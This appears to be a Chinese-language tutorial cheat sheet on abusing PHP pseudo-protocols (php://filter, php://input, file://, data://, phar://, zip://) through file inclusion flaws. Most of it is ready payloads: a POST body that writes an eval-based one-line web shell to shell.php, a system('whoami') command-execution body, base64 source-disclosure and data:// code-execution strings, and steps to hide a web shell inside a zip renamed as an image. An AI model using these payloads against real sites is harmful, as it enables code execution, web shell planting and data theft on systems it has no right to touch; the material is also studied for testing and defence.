<html><pre>
<h1>PHP伪协议<h1>
<h2>1、PHP伪协议的了解</h2>
```
file://   — 访问本地文件系统
http://   — 访问 HTTP(s) 网址
ftp://    — 访问 FTP(s) URLs
php://    — 访问各个输入/输出流（I/O streams）
zlib://   — 压缩流
data://   — 数据（RFC 2397）
glob://   — 查找匹配的文件路径模式
phar://   — PHP 归档
ssh2://   — Secure Shell 2
rar://    — RAR
ogg://    — 音频流
expect:// — 处理交互式的流
```

<h2>2、php://伪协议</h2>

1、php://filter（本地磁盘文件进行读取）

```
?filename=php://filter/convert.base64-encode/resource=xxx.php
?filename=php://filter/read=convert.base64-encode/resource=xxx.php
//两者效果一样。相对路径和绝对路径都可以
//只是读取，需要开启 allow_url_fopen，不需要开启 allow_url_include

//如以下测试代码：
&lt?php
$filename = $_GET['filename'];
include($filename);
?&gt
```

2、php://input（读取POST数据）

碰到file_get_contents()就要想到用php://input绕过，因为php伪协议也是可以利用http协议的，即可以使用POST方式传数据，具体函数意义。

测试代码：

```
&lt?php
    echo file_get_contents("php://input");
?&gt
//然后可以使用post方式进行提交，可以输出提交内容
```

3、**php://input**（写入木马）

```
&lt?php
    $filename  = $_GET['filename'];
    include($filename);
?&gt
```

利用条件：php配置文件中需同时开启 allow_url_fopen 和 allow_url_include（PHP &lt 5.3.0）,就可以造成任意代码执行，在这可以理解成远程文件包含漏洞（RFI），即POST过去PHP代码，即可执行。

利用方式如下：

```
//1、使用POST方式进行提交
?filename=php://input

//2、同时添加下面的POST请求体
&lt?PHP fputs(fopen('shell.php','w'),'&lt?php @eval($_POST[cmd])?&gt');?&gt
```

4、php://input（命令执行）

```
&lt?php
    $filename  = $_GET['filename'];
    include($filename);
?&gt
```

利用条件：php配置文件中需同时开启 allow_url_fopen 和 allow_url_include（PHP &lt 5.30）,就可以造成任意代码执行，在这可以理解成远程文件包含漏洞（RFI），即POST过去PHP代码，即可执行；

利用方式如下：

```
//1、使用POST方式进行提交
?filename=php://input

//2、同时添加下面的POST请求体
&lt?PHP system('whoami');?&gt
```

<h2>3、file://伪协议（读取文件内容）</h2>

通过file协议可以访问本地文件系统，读取文件的内容。测试代码：

```
&lt?php
    $filename  = $_GET['filename'];
    include($filename);
?&gt

//利用如下，需要使用绝对路径：
?filename=file://C:/1.txt
```

<h2>4、data://伪协议（读取文件）</h2>

和php://相似都是利用了数据流封装，简单来说就是执行文件的包含方法包含了你的输入流，通过你输入payload来实现目的； data://text/plain;base64,dGhlIHVzZXIgaXMgYWRtaW4

和php伪协议的input类似，碰到file_get_contents()来用；

```
&lt?php 
		// 打印 "I love PHP" 
		echo file_get_contents('data://text/plain;base64,SSBsb3ZlIFBIUAo='); 
?&gt
//注意：&lt?php phpinfo();,这类执行代码最后没有?&gt闭合;
//如果php.ini里的allow_url_include=On（PHP &lt 5.3.0）,就可以造成任意代码执行。如下测试代码：
&lt?php
    $filename  = $_GET['filename'];
    include($filename);
?&gt

//payload：
?filename=data://text/plain;base64,PD9waHAgcGhwaW5mbygpOw==
或者可以使用使用明文
?filename=data://text/plain,&lt?php phpinfo();
```

<h2>5、phar://伪协议</h2>

这个参数是就是php解压缩包的一个函数，不管后缀是什么，都会当做压缩包来解压。

用法：?file=phar://压缩包/内部文件

注意： PHP &gt =5.3.0 压缩包需要是zip协议压缩，rar不行，将木马文件压缩后，改为其他任意格式的文件都可以正常使用。

```
&lt?php
    $filename  = $_GET['filename'];
    include($filename);
?&gt

//利用步骤，可以相对路径： 
1、写一个一句话木马文件shell.php
2、然后用zip协议压缩为shell.zip
3、然后将后缀改为png等其他格式。
4、再使用如下进行访问：?filename=phar://xxx/xxx.png/shell.php
```

<h2>6、ZIP://伪协议</h2>

zip伪协议和phar协议类似，但是用法不同。

用法：?file=zip://[压缩文件路径]#[压缩文件内的子文件名] zip://xxx.png#shell.php。

条件： PHP &gt =5.3.0，注意在windows下测试要5.3.0&ltPHP&lt5.4 才可以 #在浏览器中要编码为%23，否则浏览器默认不会传输特殊字符。
</pre><html>